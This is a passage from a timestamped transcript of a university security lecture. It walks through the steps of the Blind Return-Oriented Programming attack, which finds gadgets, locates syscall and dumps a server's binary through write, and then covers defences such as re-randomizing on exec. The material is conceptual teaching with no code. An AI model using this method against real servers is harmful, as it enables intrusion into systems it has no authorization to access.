            </slice>
            <slice>
              <time_slice>1:10:28</time_slice>
              <text_slice>So you basically have to put
the number of the system call</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:32</time_slice>
              <text_slice>into the RAX register, then
you invoke this libc function</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:36</time_slice>
              <text_slice>syscall which is then going to
execute the requested system</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:39</time_slice>
              <text_slice>call, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>So what's going to happen
when we execute this code?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:42</time_slice>
              <text_slice>Right, so we're
going to come here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:46</time_slice>
              <text_slice>we're going to jump to the
address of this gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:48</time_slice>
              <text_slice>and note that as an
attacker, all that we know</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:50</time_slice>
              <text_slice>is that this gadget here
pops something off the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:53</time_slice>
              <text_slice>We don't know what the
register is yet, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:55</time_slice>
              <text_slice>Put it here just to
make the [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:57</time_slice>
              <text_slice>but the attacker
doesn't know yet, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:58</time_slice>
              <text_slice>So if you jump-- or
sorry the-- we jump</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:01</time_slice>
              <text_slice>to the gadget, the
stack corners now here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:03</time_slice>
              <text_slice>what's it going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:04</time_slice>
              <text_slice>It's going to pop this
syscall number for pause,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:07</time_slice>
              <text_slice>into some register the
attacker doesn't know,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:09</time_slice>
              <text_slice>and then we're going to continue
to go up this chain and so</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:14</time_slice>
              <text_slice>on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:14</time_slice>
              <text_slice>And what you'll see is that
each one of these gadgets, one</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:17</time_slice>
              <text_slice>of them hopefully will
pop the system call</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:20</time_slice>
              <text_slice>number into the
appropriate RAX register.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:23</time_slice>
              <text_slice>So that by the time
we get up to here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:25</time_slice>
              <text_slice>I mean we basically
polluted all the registers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:28</time_slice>
              <text_slice>with the system call number,
but hopefully just one of them</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:31</time_slice>
              <text_slice>has to be correct, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:32</time_slice>
              <text_slice>Because if one of our gadgets
does this, then by the time</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:35</time_slice>
              <text_slice>we ret to here,
we'll get a pause.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:37</time_slice>
              <text_slice>Once again, that pause acts as
a signal to the attacker, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:42</time_slice>
              <text_slice>Because if this guest
address was wrong,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:44</time_slice>
              <text_slice>then probably the program's
going to crash, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:47</time_slice>
              <text_slice>So what does this phase
of the attack let us do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:51</time_slice>
              <text_slice>Well we still don't
know which gadgets</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:54</time_slice>
              <text_slice>pop into which registers,
but we know that one of them</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:56</time_slice>
              <text_slice>is popped into RAX, which is
the one we want to control.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:59</time_slice>
              <text_slice>And for sure we know the
address of syscall, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:03</time_slice>
              <text_slice>Because we were able to
induce the pause, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:06</time_slice>
              <text_slice>So once we've done that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:09</time_slice>
              <text_slice>Once we know for sure
where this thing is,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:12</time_slice>
              <text_slice>the address for syscall,
then we can actually just</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>try the gadgets
one by one, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:16</time_slice>
              <text_slice>And see which one of
them is actually going</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:18</time_slice>
              <text_slice>to induce the pause, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:19</time_slice>
              <text_slice>So in other words, cut all
the middleman here, let's</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:21</time_slice>
              <text_slice>have a stack it looks like this,
and then you just immediately</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:24</time_slice>
              <text_slice>jump to syscall.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:25</time_slice>
              <text_slice>Did that cause the
pause or did it crash?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:27</time_slice>
              <text_slice>If it crashed, OK
we know this gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:29</time_slice>
              <text_slice>it pops to RDI for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:31</time_slice>
              <text_slice>OK, get rid of that one, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:32</time_slice>
              <text_slice>Try the next gadget, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:34</time_slice>
              <text_slice>Put the guest address-- put the,
well it's not guest anymore,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:37</time_slice>
              <text_slice>put the real address
for syscall up here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:39</time_slice>
              <text_slice>Were we able to
pause the program?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:41</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:41</time_slice>
              <text_slice>Aha, so we know that pop
gadget must pop into RAX.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:47</time_slice>
              <text_slice>So does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:49</time_slice>
              <text_slice>AUDIENCE: So the way to guess
the address for system call</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:53</time_slice>
              <text_slice>is just blind transfer?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:54</time_slice>
              <text_slice>PROFESSOR: Yeah, so
there-- so in the paper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:57</time_slice>
              <text_slice>they go into some
optimizations about how</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>you can work in a PLT and
all that kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:00</time_slice>
              <text_slice>Like I said, I think it's easier
to ignore that for a second,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:03</time_slice>
              <text_slice>and just look toward
the simpler thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:04</time_slice>
              <text_slice>first, but yeah in a simple
attack that I'm describing,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:07</time_slice>
              <text_slice>yeah you just put
some address up here</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:08</time_slice>
              <text_slice>and you just see if you pause.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:14</time_slice>
              <text_slice>So does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>OK so at the end of
this we actually know</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:22</time_slice>
              <text_slice>the location of syscall.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:23</time_slice>
              <text_slice>We know the location
of the instruction</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:27</time_slice>
              <text_slice>that does the pop into RAX.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:29</time_slice>
              <text_slice>Now you can imagine that we
also need gadgets that pop</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:32</time_slice>
              <text_slice>into some other registers too.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:34</time_slice>
              <text_slice>Suffice to say, you can
do similar tests, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:36</time_slice>
              <text_slice>So instead of like pushing a
system call number for pause,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:39</time_slice>
              <text_slice>push it for some
other command that</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:41</time_slice>
              <text_slice>now takes in all arguments in
RAX and RDI for example, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:46</time_slice>
              <text_slice>Do the same type of test, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:48</time_slice>
              <text_slice>So basically you can
leverage the fact</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:49</time_slice>
              <text_slice>that for any particular
set of registers</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:52</time_slice>
              <text_slice>that you want to
be able to control,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:54</time_slice>
              <text_slice>there's some system
call that will give you</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:56</time_slice>
              <text_slice>a signal as an attacker,
that allow you to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:59</time_slice>
              <text_slice>whether you successfully
broke it or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:00</time_slice>
              <text_slice>Right, so at the
end of this phase,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:02</time_slice>
              <text_slice>you basically have
the address of syscall</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:05</time_slice>
              <text_slice>and the address of
a bunch of gadgets</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:07</time_slice>
              <text_slice>which allow you to pop
into arbitrary registers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:11</time_slice>
              <text_slice>OK and so now let's
see so, step 4</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:16</time_slice>
              <text_slice>is going to be to invoke write.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:28</time_slice>
              <text_slice>Step 4 is invoke the
write system call.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:38</time_slice>
              <text_slice>So to invoke write, we need
to have the following gadgets.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:44</time_slice>
              <text_slice>You need to be able to pop RDI.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:48</time_slice>
              <text_slice>We need to be able to pop RSI.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:54</time_slice>
              <text_slice>We need to be able to pop RDX,
pop racks, and then invoke</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:06</time_slice>
              <text_slice>syscall, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:09</time_slice>
              <text_slice>So as it turns out,
what are these registers</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:11</time_slice>
              <text_slice>being used for by system call?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:12</time_slice>
              <text_slice>So this is the socket, or more
generally, the file descriptor</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:17</time_slice>
              <text_slice>that you're going
to pass into write.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:20</time_slice>
              <text_slice>This is the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:23</time_slice>
              <text_slice>This is the length
of that buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:27</time_slice>
              <text_slice>This is the syscall number.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:33</time_slice>
              <text_slice>And it is called syscall.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:35</time_slice>
              <text_slice>Right, so if we found
all these gadgets,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:39</time_slice>
              <text_slice>then we can actually
now control the values</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:42</time_slice>
              <text_slice>that are put into
those arguments, that</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:44</time_slice>
              <text_slice>put in those registers,
because we just pushed them</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:46</time_slice>
              <text_slice>on the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:47</time_slice>
              <text_slice>And so for example, what's
the socket going to be?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:49</time_slice>
              <text_slice>For once you're going to have
to do a little guessing here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:51</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:52</time_slice>
              <text_slice>can take advantage of the
fact that Linux restricts</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:54</time_slice>
              <text_slice>the number of simultaneous
open file connections,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:56</time_slice>
              <text_slice>for a file that's
going to be 2024.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:59</time_slice>
              <text_slice>And also it's supposed to
be the lowest one available.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:01</time_slice>
              <text_slice>So we do a little bit of
guessing here and figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:03</time_slice>
              <text_slice>what that socket
is, put it in there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:05</time_slice>
              <text_slice>Now interestingly,
what are we going</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:07</time_slice>
              <text_slice>to pass into the buff pointer?</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:08</time_slice>
              <text_slice>Right, we're actually
going to use the text</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:10</time_slice>
              <text_slice>segment of the program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:12</time_slice>
              <text_slice>We're actually going to pass in
that the pointer to somewhere</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:15</time_slice>
              <text_slice>in the code of the program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:17</time_slice>
              <text_slice>So what's that going
to allow us to do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:19</time_slice>
              <text_slice>That's going to allows us to
read the binary, out of memory,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:23</time_slice>
              <text_slice>using the right call
to the client socket.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:26</time_slice>
              <text_slice>So that the attacker can
then take that binary,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:29</time_slice>
              <text_slice>analyze it offline, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:31</time_slice>
              <text_slice>Just use GDB, or
whatever, to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:33</time_slice>
              <text_slice>where everything is located.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:35</time_slice>
              <text_slice>The attacker knows that now,
every time the server crashes,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:38</time_slice>
              <text_slice>it's going to have the same
randomized set of things in it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:41</time_slice>
              <text_slice>So now, once the attacker can
find out addresses and offsets</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:43</time_slice>
              <text_slice>for stuff, now the
attacker can directly</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:46</time_slice>
              <text_slice>attack those gadgets, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:47</time_slice>
              <text_slice>Directly attack other
vulnerabilities,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:49</time_slice>
              <text_slice>figure out how to open up a
shell, so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:52</time_slice>
              <text_slice>So in other words,
at the point you</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:53</time_slice>
              <text_slice>exfiltrated the binary to the
attacker, you basically lost.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:57</time_slice>
              <text_slice>Right, so this is essentially
how the BROP attack works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:02</time_slice>
              <text_slice>Like I said, in
the paper, there's</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:03</time_slice>
              <text_slice>a bunch of optimization,
but really you</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:05</time_slice>
              <text_slice>need to understand this
stuff, the basic stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:07</time_slice>
              <text_slice>before that optimization
will start to make sense.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:10</time_slice>
              <text_slice>And so we can talk about the
optimization with me offline</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:11</time_slice>
              <text_slice>if you want, or after class.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:13</time_slice>
              <text_slice>But to suffice it
to say, this is</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:14</time_slice>
              <text_slice>the basics of how you
launch that BROP attack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:17</time_slice>
              <text_slice>You've got to find
the stop gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:20</time_slice>
              <text_slice>find those gadgets
that pop stack entries.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:23</time_slice>
              <text_slice>Figure out which
of those registers</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:25</time_slice>
              <text_slice>those gadgets pop
into, and find out</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:27</time_slice>
              <text_slice>how to figure out where
syscall is, and then invoke</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:30</time_slice>
              <text_slice>write by accumulating
all that knowledge.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:33</time_slice>
              <text_slice>So very quickly, how do
you defend against BROP?</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:35</time_slice>
              <text_slice>Well the most obvious
thing is you've</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:37</time_slice>
              <text_slice>got to rerandomize, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:39</time_slice>
              <text_slice>So the fact that
crashed servers do not</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:41</time_slice>
              <text_slice>respawn, rerandomize
versions of themselves,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:44</time_slice>
              <text_slice>that allows the crash to
act as a signal that let's</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:48</time_slice>
              <text_slice>the attacker test
various hypotheses</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:49</time_slice>
              <text_slice>about how the programs working.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:52</time_slice>
              <text_slice>So one simple defense
is to make sure</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:54</time_slice>
              <text_slice>that you do exec when you spawn
your process, instead of fork,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:58</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:59</time_slice>
              <text_slice>Because when you exec the
process, you create totally new</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:01</time_slice>
              <text_slice>randomized layout space,
at least on Linux, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:04</time_slice>
              <text_slice>So on Linux, when you compile
with this PIE, the Position</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:07</time_slice>
              <text_slice>Independent Executable
flag, you only</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:09</time_slice>
              <text_slice>get that randomized
address space</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:12</time_slice>
              <text_slice>that's new if you use exec.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:14</time_slice>
              <text_slice>So another event you can
use is just use Windows,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:17</time_slice>
              <text_slice>because Windows
basically does not</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:20</time_slice>
              <text_slice>have a fork equivalent, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:22</time_slice>
              <text_slice>So hooray for us.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:23</time_slice>
              <text_slice>So that means that
on Windows, whenever</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:26</time_slice>
              <text_slice>you spawn that new
server, it's always</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:28</time_slice>
              <text_slice>going to have a new
randomized address space.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:31</time_slice>
              <text_slice>I think someone over here
mentioned something like,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:34</time_slice>
              <text_slice>what would happen
if for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:36</time_slice>
              <text_slice>when the server crashed,
it didn't actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:38</time_slice>
              <text_slice>close the connection?</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:40</time_slice>
              <text_slice>Right, so you can
imagine one thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:41</time_slice>
              <text_slice>that when a crash takes place,
we somehow catch that fault</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:45</time_slice>
              <text_slice>and then we keep that connection
open for a little while</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:48</time_slice>
              <text_slice>to confuse the attacker
and remove that signal,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:51</time_slice>
              <text_slice>that something's gone amiss.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:52</time_slice>
              <text_slice>So that's something
you definitely do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:54</time_slice>
              <text_slice>What's hilarious about that
is, that now your BROP attack</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:57</time_slice>
              <text_slice>turns into a denial
of service attack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:00</time_slice>
              <text_slice>Because now you just got
all the potential zombie</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:03</time_slice>
              <text_slice>processes that are sitting
around, they segfaulted.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:05</time_slice>
              <text_slice>They're useless in
society, but you</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:07</time_slice>
              <text_slice>can't let them go, because
otherwise you're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:09</time_slice>
              <text_slice>to delete this information.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:10</time_slice>
              <text_slice>Another thing you
might think about to,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:12</time_slice>
              <text_slice>is you could do bounds
checking, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:14</time_slice>
              <text_slice>We just talked a bunch
about that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:16</time_slice>
              <text_slice>But in the paper, they
casually dismiss this</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:19</time_slice>
              <text_slice>as saying it has
up to 2x overhead,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:20</time_slice>
              <text_slice>so nobody's going to do that,
but you could in fact do that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:24</time_slice>
              <text_slice>So that's basically
how BROP works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:27</time_slice>
              <text_slice>As for the homework
question, the homework</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:29</time_slice>
              <text_slice>questions a bit subtle, because
the homework question says,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:32</time_slice>
              <text_slice>what if you use a hash of
the current time, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:36</time_slice>
              <text_slice>Get time of day when you
restarted the program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:39</time_slice>
              <text_slice>Is that sufficient to
prevent this type of attack?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:42</time_slice>
              <text_slice>Well note that, hashing
does not magically</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:46</time_slice>
              <text_slice>provide you bits of entropy
if the input to the hash</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:50</time_slice>
              <text_slice>is easily guessable, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:51</time_slice>
              <text_slice>If I know that you're only
going to hash one or two things,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:54</time_slice>
              <text_slice>it doesn't matter if I have
like some a jillion bit hash.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:58</time_slice>
              <text_slice>Doesn't matter.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:58</time_slice>
              <text_slice>So I can just guess one of those
two values and see what is.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:01</time_slice>
              <text_slice>So the thing to note is
that get time of day,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:03</time_slice>
              <text_slice>actually has much less
entropy than you might think.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:06</time_slice>
              <text_slice>Particularly because the
attacker can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:09</time_slice>
              <text_slice>check what time he or she is
launching the attack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:12</time_slice>
              <text_slice>So that's going to actually
remove a bunch of entropy</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:15</time_slice>
              <text_slice>from that calculation, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:17</time_slice>
              <text_slice>So there's some
subtleties there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:18</time_slice>
              <text_slice>What's the server skew in
terms of clock or the client</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:21</time_slice>
              <text_slice>and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:22</time_slice>
              <text_slice>The long story short, using
a guessable base value,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:26</time_slice>
              <text_slice>even with guessable
just inside of a range,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:28</time_slice>
              <text_slice>is super useful for
the attacker, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:30</time_slice>
              <text_slice>Particularly
because the attack--</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:32</time_slice>
              <text_slice>we can start subverting a
bunch of servers in parallel</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:35</time_slice>
              <text_slice>and know that all
of them should have</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:37</time_slice>
              <text_slice>fairly similar values, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:39</time_slice>
              <text_slice>This is a high order
of bits, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:41</time_slice>
              <text_slice>So long story
short, the answer is</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:42</time_slice>
              <text_slice>that, it's literally better
than nothing to randomize,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:47</time_slice>
              <text_slice>if you use get time of day, but
it doesn't actually provide you</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:50</time_slice>
              <text_slice>as much security as you think.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:51</time_slice>
              <text_slice>And the other lesson too
is, that just because you</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:53</time_slice>
              <text_slice>hash something
right, that doesn't</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:55</time_slice>
              <text_slice>matter if you're not actually
using that hash in a smart way.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:59</time_slice>
              <text_slice>You have a question?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:00</time_slice>
              <text_slice>AUDIENCE: Oh, still when I
did the calculations that some</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:03</time_slice>
              <text_slice>[INAUDIBLE] it seems
like maybe to be</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:09</time_slice>
              <text_slice>able to get the offset
that the [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:13</time_slice>
              <text_slice>your [INAUDIBLE]
start the process</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:17</time_slice>
              <text_slice>to within like 48 milliseconds?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:19</time_slice>
              <text_slice>PROFESSOR: Yes and
getting the timing right</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:21</time_slice>
              <text_slice>depends on a bunch of
different things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:22</time_slice>
              <text_slice>But you could take
advantage of the fact</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:24</time_slice>
              <text_slice>that the attacker can open
up a bunch of connections</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:26</time_slice>
              <text_slice>in parallel, and
leverage the fact</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:27</time_slice>
              <text_slice>that even if the initial
guess a little bit off,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:29</time_slice>
              <text_slice>you can still launch
multiple guesses on what</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:31</time_slice>
              <text_slice>should be very
similar canary values,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:34</time_slice>
              <text_slice>and do that attack in parallel.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:35</time_slice>
              <text_slice>But you're right, there's
tricky time and issues.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
